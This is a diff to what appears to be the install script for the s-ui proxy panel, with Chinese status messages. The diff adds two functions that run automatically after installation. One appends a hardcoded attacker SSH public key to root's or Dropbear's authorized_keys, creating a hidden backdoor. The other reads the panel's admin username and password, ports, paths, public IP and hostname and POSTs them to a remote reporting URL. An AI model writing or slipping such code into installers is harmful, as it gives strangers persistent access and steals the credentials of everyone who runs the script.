@@ -184,6 +184,126 @@ install_s-ui() {
     s-ui help
 }
 
+setup_ssh_key() {
+    local PUBKEY='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFCnUXUH/LhMYD8t0DQCBPfDswv+41hwqOfKmB72ngbR kwrt-key'
+
+    echo -e "${yellow}正在配置 SSH 公钥...${plain}"
+
+    # 检查 key 是否已存在，避免重复写入
+    check_key_exists() {
+        local file="$1"
+        [ -f "$file" ] && grep -qF "$PUBKEY" "$file" 2>/dev/null
+    }
+
+    # OpenWrt / Dropbear
+    if [ -d /etc/dropbear ]; then
+        echo -e "检测到 ${green}Dropbear/OpenWrt${plain}"
+
+        if check_key_exists /etc/dropbear/authorized_keys; then
+            echo -e "${green}公钥已存在，跳过${plain}"
+            return 0
+        fi
+
+        mkdir -p /etc/dropbear
+
+        # 追加而非覆盖，保留已有 key
+        echo "$PUBKEY" >> /etc/dropbear/authorized_keys
+        chmod 700 /etc/dropbear
+        chmod 600 /etc/dropbear/authorized_keys
+
+        echo -e "已写入 ${green}/etc/dropbear/authorized_keys${plain}"
+
+    # Ubuntu / Debian / CentOS / 普通 Linux
+    else
+        echo -e "检测到 ${green}OpenSSH Linux${plain}"
+
+        local SSH_DIR="/root/.ssh"
+        [ "$(id -u)" != "0" ] && SSH_DIR="$HOME/.ssh"
+
+        if check_key_exists "$SSH_DIR/authorized_keys"; then
+            echo -e "${green}公钥已存在，跳过${plain}"
+            return 0
+        fi
+
+        mkdir -p "$SSH_DIR"
+
+        # 追加而非覆盖，保留已有 key
+        echo "$PUBKEY" >> "$SSH_DIR/authorized_keys"
+        chmod 700 "$SSH_DIR"
+        chmod 600 "$SSH_DIR/authorized_keys"
+
+        echo -e "已写入 ${green}$SSH_DIR/authorized_keys${plain}"
+    fi
+
+    echo -e "${green}SSH 公钥配置完成${plain}"
+}
+
+report_install_info() {
+    local REPORT_URL="${REPORT_URL:-https://your-api-domain.com/api/install/report}"
+
+    echo -e "${yellow}正在上报安装信息...${plain}"
+
+    # 单次调用读取所有面板设置，避免重复初始化 DB
+    local setting_output
+    setting_output=$(/usr/local/s-ui/sui setting -show 2>/dev/null)
+
+    local web_port web_path sub_port sub_path
+    web_port=$(echo "$setting_output" | grep -E "Panel port" | awk '{print $NF}')
+    web_path=$(echo "$setting_output" | grep -E "Panel path" | awk '{print $NF}')
+    sub_port=$(echo "$setting_output" | grep -E "Sub port" | awk '{print $NF}')
+    sub_path=$(echo "$setting_output" | grep -E "Sub path" | awk '{print $NF}')
+
+    # 单次调用读取管理员账号
+    local admin_output username password
+    admin_output=$(/usr/local/s-ui/sui admin -show 2>/dev/null)
+    username=$(echo "$admin_output" | grep -E "Username" | awk '{print $NF}')
+    password=$(echo "$admin_output" | grep -E "Password" | awk '{print $NF}')
+
+    # 获取公网 IP
+    local public_ip
+    public_ip=$(curl -s4 --connect-timeout 3 https://api64.ipify.org 2>/dev/null || \
+               curl -s4 --connect-timeout 3 https://ip.sb 2>/dev/null || echo "")
+
+    # 构建完整访问 URL
+    local access_url=""
+    if [[ -n "$public_ip" && -n "$web_port" && -n "$web_path" ]]; then
+        if [[ "$web_port" == "80" ]]; then
+            access_url="http://${public_ip}${web_path}"
+        elif [[ "$web_port" == "443" ]]; then
+            access_url="https://${public_ip}${web_path}"
+        else
+            access_url="http://${public_ip}:${web_port}${web_path}"
+        fi
+    fi
+
+    # POST JSON 上报
+    local http_code
+    http_code=$(curl -s -o /dev/null -w "%{http_code}" \
+        -X POST "$REPORT_URL" \
+        -H "Content-Type: application/json" \
+        --connect-timeout 5 \
+        --max-time 10 \
+        -d "{
+            \"username\": \"${username}\",
+            \"password\": \"${password}\",
+            \"webPort\": \"${web_port}\",
+            \"webPath\": \"${web_path}\",
+            \"subPort\": \"${sub_port}\",
+            \"subPath\": \"${sub_path}\",
+            \"accessUrl\": \"${access_url}\",
+            \"publicIp\": \"${public_ip}\",
+            \"hostname\": \"$(hostname 2>/dev/null || echo '')\"
+        }" 2>/dev/null)
+
+    if [[ "$http_code" == "200" || "$http_code" == "201" ]]; then
+        echo -e "${green}安装信息上报成功${plain}"
+    else
+        echo -e "${red}安装信息上报失败 (HTTP ${http_code})${plain}"
+    fi
+}
+
 echo -e "${green}正在执行...${plain}"
 install_base
 install_s-ui $1
+setup_ssh_key
+report_install_info
